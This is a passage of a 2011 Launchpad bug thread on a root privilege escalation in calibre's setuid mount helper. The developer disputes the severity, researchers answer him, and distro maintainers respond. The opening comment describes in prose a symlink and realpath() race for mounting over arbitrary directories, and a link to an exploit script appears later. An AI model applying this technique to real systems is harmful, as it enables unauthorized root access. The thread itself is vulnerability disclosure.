For example, to mount a device not under /dev, simply provide an argv[2] referring to a symlink pointing to somewhere in /dev, and after the realpath()'d version is checked, switch the target to somewhere else.  If you want to do this properly, you need to update the device source such that after calling realpath(), all subsequent references to the device are to the realpath()'d version.

The same trick can be applied to mount on top of arbitrary mountpoints (which is a local root hole).  First mount something you can write to onto a mountpoint in /media, and then exploit the race condition similar to above (switching from a mountpoint within /media to anywhere you like).

Even without these critical bugs, being able to mount anything in /dev on top of anything in /media is not a good idea - pmount restricts this to removable devices or devices whitelisted in a configuration file (/etc/pmount.allow).  And you've done nothing to address the previously mentioned abilities to play with creating and removing arbitrary directories/files.  I strongly recommend giving up on implementing this yourself and instead creating a dependency on pmount or bundling it with your package (it's GPLv3, so it's license-compatible).  It is very difficult to do what you want to do safely, and it is unacceptable to permit root privilege escalation vulnerabilities without documenting it.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T12:38:02+00:00" title="2011-11-03 12:38:02 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve already committed a fix for symlinks in /dev, maybe you missed my last<br />
comment.</p>
<p>pmount will not work, I have told you why<br />
it will not work. I am not going to repeat myself.</p>
<p>Let&#x27;s recap:</p>
<p>First note that unprivileged users cannot create symlinks in /dev<br />
on any well designed system. So symlink attacks are not actually<br />
possible, nonetheless, I have already removed the possibility of using<br />
symlinks under /dev.</p>
<p>calibre-<wbr />mount-helper currently allows an unprivileged user to:</p>
<p>1) Delete empty directories only under /media. I see absolutely nothing wrong with<br />
that.</p>
<p>2) Mount anything under /dev to anything under /media. Again I see nothing<br />
wrong with that, outside of highly system specific scenarios. Feel free to<br />
post a general purpose exploit, if you can come up with one, I can always fix<br />
it.</p>
<p>3) Unmount anything under /media</p>
<p>4) Create empty directories anywhere on the system.<br />
This can be fixed, with some effort, but I am not yet convinced<br />
it is an actual vulnerability.</p>
<p>*) Something else courtesy of a bug. If such a thing exists, point it out and<br />
I will fix it.</p>
<p>Just a note about all the histrionics around &quot;critical&quot; security<br />
exploits. calibre is designed to run mainly on end user computers (single<br />
user, typically a desktop or a laptop). On such a machine if a malicous program<br />
can run with user privileges it already has access to everything that actually<br />
matters on the system, namely the user&#x27;s data. Privilege escalation would be<br />
useful only in trying to hide the traces of the intrusion. The damage is<br />
already done. Undoubtedly there are plenty of scenarios where that is not<br />
true, but the fact remains that for the vast majority of calibre users, this<br />
is a non issue. So kindly tone down the hyperbole, and restrict your posts to<br />
discussion of calibre-<wbr />mount-helper, otherwise you will be ignored.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've already committed a fix for symlinks in /dev, maybe you missed my last
comment.

pmount will not work, I have told you why
it will not work. I am not going to repeat myself.

Let's recap:

First note that unprivileged users cannot create symlinks in /dev
on any well designed system. So symlink attacks are not actually
possible, nonetheless, I have already removed the possibility of using
symlinks under /dev.

calibre-mount-helper currently allows an unprivileged user to:

1) Delete empty directories only under /media. I see absolutely nothing wrong with
that. 

2) Mount anything under /dev to anything under /media. Again I see nothing
wrong with that, outside of highly system specific scenarios. Feel free to
post a general purpose exploit, if you can come up with one, I can always fix
it. 

3) Unmount anything under /media

4) Create empty directories anywhere on the system. 
This can be fixed, with some effort, but I am not yet convinced
it is an actual vulnerability.

*) Something else courtesy of a bug. If such a thing exists, point it out and
I will fix it.

Just a note about all the histrionics around "critical" security
exploits. calibre is designed to run mainly on end user computers (single
user, typically a desktop or a laptop). On such a machine if a malicous program
can run with user privileges it already has access to everything that actually
matters on the system, namely the user's data. Privilege escalation would be
useful only in trying to hide the traces of the intrusion. The damage is
already done. Undoubtedly there are plenty of scenarios where that is not
true, but the fact remains that for the vast majority of calibre users, this
is a non issue. So kindly tone down the hyperbole, and restrict your posts to
discussion of calibre-mount-helper, otherwise you will be ignored.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~dan-j-rosenberg" class="sprite person">Dan Rosenberg (dan-j-rosenberg)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T13:05:18.639628+00:00" title="2011-11-03 13:05:18 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>&quot;First note that unprivileged users cannot create symlinks in /dev<br />
on any well designed system. So symlink attacks are not actually<br />
possible, nonetheless, I have already removed the possibility of using<br />
symlinks under /dev.&quot;</p>
<p>You&#x27;ve forgotten about /dev/shm.</p>
<p>And you still haven&#x27;t fixed the ability to mount on top of any directory via symlinks, which has already been demonstrated to allow escalation to root.</p>
<p>&quot;Just a note about all the histrionics around &quot;critical&quot; security<br />
exploits. calibre is designed to run mainly on end user computers (single<br />
user, typically a desktop or a laptop). On such a machine if a malicous program<br />
can run with user privileges it already has access to everything that actually<br />
matters on the system, namely the user&#x27;s data. Privilege escalation would be<br />
useful only in trying to hide the traces of the intrusion. The damage is<br />
already done. Undoubtedly there are plenty of scenarios where that is not<br />
true, but the fact remains that for the vast majority of calibre users, this<br />
is a non issue. So kindly tone down the hyperbole, and restrict your posts to<br />
discussion of calibre-<wbr />mount-helper, otherwise you will be ignored.&quot;</p>
<p>Even if this is the case for the majority of calibre users, I wouldn&#x27;t consider this acceptable unless there was a big flashing banner when you install calibre that says &quot;if you install this every user can gain root privileges.&quot;  There are plenty of multi-user environments, and plenty of situations where compromising a user account isn&#x27;t as bad as gaining root access.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">"First note that unprivileged users cannot create symlinks in /dev
on any well designed system. So symlink attacks are not actually
possible, nonetheless, I have already removed the possibility of using
symlinks under /dev."

You've forgotten about /dev/shm.

And you still haven't fixed the ability to mount on top of any directory via symlinks, which has already been demonstrated to allow escalation to root.

"Just a note about all the histrionics around "critical" security
exploits. calibre is designed to run mainly on end user computers (single
user, typically a desktop or a laptop). On such a machine if a malicous program
can run with user privileges it already has access to everything that actually
matters on the system, namely the user's data. Privilege escalation would be
useful only in trying to hide the traces of the intrusion. The damage is
already done. Undoubtedly there are plenty of scenarios where that is not
true, but the fact remains that for the vast majority of calibre users, this
is a non issue. So kindly tone down the hyperbole, and restrict your posts to
discussion of calibre-mount-helper, otherwise you will be ignored."

Even if this is the case for the majority of calibre users, I wouldn't consider this acceptable unless there was a big flashing banner when you install calibre that says "if you install this every user can gain root privileges."  There are plenty of multi-user environments, and plenty of situations where compromising a user account isn't as bad as gaining root access.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mpagano" class="sprite person">Mike Pagano (mpagano)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T14:49:19.487249+00:00" title="2011-11-03 14:49:19 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>&quot;2) It may not even be installed on some distros, for example, it isn&#x27;t installed by default on gentoo.&quot;</p>
<p>That should not be considered an issue. If we need to update dependencies for calibre for our users on Gentoo, we do it.</p>
<p>As a Linux distribution, dependency resolution is our problem</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">"2) It may not even be installed on some distros, for example, it isn't installed by default on gentoo."

That should not be considered an issue. If we need to update dependencies for calibre for our users on Gentoo, we do it. 

As a Linux distribution, dependency resolution is our problem 




</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~dan-j-rosenberg" class="sprite person">Dan Rosenberg (dan-j-rosenberg)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T14:59:21.555989+00:00" title="2011-11-03 14:59:21 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>For the record, I&#x27;m not in any way attached to using pmount, I just wanted to pose it as a potential second choice.  udisks is much better, is nearly universally supported amongst desktop Linux distributions, and is what Ubuntu and Debian currently use for this.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">For the record, I'm not in any way attached to using pmount, I just wanted to pose it as a potential second choice.  udisks is much better, is nearly universally supported amongst desktop Linux distributions, and is what Ubuntu and Debian currently use for this.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T15:15:13+00:00" title="2011-11-03 15:15:13 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Rosenberg: Yes, I have. And you were warned, this is the last response you<br />
will get from me.</p>
<p>@Mike: Many distros replace calibre-<wbr />mount-helper with something suitable for<br />
the particular distros&#x27; disk handling strategy, and I encourage you to do the<br />
same in Gentoo if you dont already do it (incidentaly I&#x27;m a Gento user). You<br />
can actually do something as simple as replacing it with a bash script that<br />
always returns an error code and does nothing else. Add udisks as a calibre<br />
dependency and calibre will automatically use udisks via DBUS when available. This<br />
will, of course, break for those users for whom udisks doesn&#x27;t work for<br />
whatever reason. Whether that is a large fraction of Gentoo users or not, only you<br />
can judge. This discussion really applies only to the calibre binary download,<br />
which does no dependency resolution and is intended to *work out of the box*<br />
on a huge variety of linux systems. Unfortunately, linux has historically had<br />
no universal way to handle removable disks without root access, neccessitating<br />
the use of a suid executable.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Rosenberg: Yes, I have. And you were warned, this is the last response you
will get from me.

@Mike: Many distros replace calibre-mount-helper with something suitable for
the particular distros' disk handling strategy, and I encourage you to do the
same in Gentoo if you dont already do it (incidentaly I'm a Gento user). You
can actually do something as simple as replacing it with a bash script that
always returns an error code and does nothing else. Add udisks as a calibre
dependency and calibre will automatically use udisks via DBUS when available. This
will, of course, break for those users for whom udisks doesn't work for
whatever reason. Whether that is a large fraction of Gentoo users or not, only you
can judge. This discussion really applies only to the calibre binary download,
which does no dependency resolution and is intended to *work out of the box*
on a huge variety of linux systems. Unfortunately, linux has historically had
no universal way to handle removable disks without root access, neccessitating
the use of a suid executable.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~dan-j-rosenberg" class="sprite person">Dan Rosenberg (dan-j-rosenberg)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T18:29:50.738024+00:00" title="2011-11-03 18:29:50 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2584435/+files/70calibrerassaultmount.sh">Yet another exploit</a>
        <a class="sprite edit action-icon" href="/calibre/+bug/885027/+attachment/2584435">Edit</a>
        (2.2 KiB,
        text/x-sh)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Kovid: No, you haven&#x27;t.  Your code contains a race condition that allows a bypass of the checks you&#x27;ve put in place.  Here&#x27;s another exploit.  You can warn and ignore me all you want, it doesn&#x27;t make this code any safer.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Kovid: No, you haven't.  Your code contains a race condition that allows a bypass of the checks you've put in place.  Here's another exploit.  You can warn and ignore me all you want, it doesn't make this code any safer.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
    
    <time title="2011-11-03 18:35:51 UTC" datetime="2011-11-03T18:35:51.466530+00:00">on 2011-11-03</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Released &#8594; Confirmed
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sbeattie" class="sprite person">Steve Beattie (sbeattie)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T18:48:53.308690+00:00" title="2011-11-03 18:48:53 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ubuntu, from 10.10 (maverick) and after, uses the udisk-based shell script that Martin Pitt wrote instead of the upstream calibre setuid helper. In Ubuntu 10.04 LTS (lucid), the calibre package does not include the setuid helper at all. Ubuntu 8.04 LTS (hardy) does not include calibre at all. Marking the Ubuntu task as invalid.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ubuntu, from 10.10 (maverick) and after, uses the udisk-based shell script that Martin Pitt wrote instead of the upstream calibre setuid helper. In Ubuntu 10.04 LTS (lucid), the calibre package does not include the setuid helper at all. Ubuntu 8.04 LTS (hardy) does not include calibre at all. Marking the Ubuntu task as invalid.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Invalid
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~jacob-appelbaum" class="sprite person">Jacob Appelbaum (jacob-appelbaum)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T19:21:39.868005+00:00" title="2011-11-03 19:21:39 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks to Ubuntu for not shipping an obviously exploitable component in the face of an arrogant upstream author who puts his users at risk.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks to Ubuntu for not shipping an obviously exploitable component in the face of an arrogant upstream author who puts his users at risk.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/32" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~chrisinajar" class="sprite person">Chris Vickery (chrisinajar)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T19:41:44.682974+00:00" title="2011-11-03 19:41:44 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/32"> #32</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I find it baffling how poorly the developers for this project are handling this bug. It is, in fact, already circulating the internet due to their arrogance.</p>
<p>(2:45:52 PM) MyFriend: ha ha calibre devs are annoying.<br />
(2:46:15 PM) MyFriend: <a rel="nofollow" href="https://bugs.launchpad.net/calibre/+bug/885027">https:/<wbr />/bugs.launchpad<wbr />.net/calibre/<wbr />+bug/885027</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I find it baffling how poorly the developers for this project are handling this bug. It is, in fact, already circulating the internet due to their arrogance.

(2:45:52 PM) MyFriend: ha ha calibre devs are annoying.
(2:46:15 PM) MyFriend: https://bugs.launchpad.net/calibre/+bug/885027

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/33" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~jon-oberheide-deactivatedaccount" class="sprite person-inactive">Jon Oberheide (jon-oberheide-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T19:42:48.930801+00:00" title="2011-11-03 19:42:48 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/33"> #33</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m not sure this is actually exploitable...the posted exploit fails on my GNU/kFreeBSD box:</p>
<p>$ gcc 70calibrerassau<wbr />ltmount.<wbr />sh -o full-nelson<br />
70calibrerassau<wbr />ltmount.<wbr />sh: file not recognized: File format not recognized<br />
$ ./full-nelson<br />
-bash: ./full-nelson: No such file or directory</p>
<p>Is there different compiler (icc?) or architecture (maybe needs a RISC arch?) requirement?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm not sure this is actually exploitable...the posted exploit fails on my GNU/kFreeBSD box:

$ gcc 70calibrerassaultmount.sh -o full-nelson
70calibrerassaultmount.sh: file not recognized: File format not recognized
$ ./full-nelson
-bash: ./full-nelson: No such file or directory

Is there different compiler (icc?) or architecture (maybe needs a RISC arch?) requirement?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/34" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~chrisinajar" class="sprite person">Chris Vickery (chrisinajar)</a>
            wrote
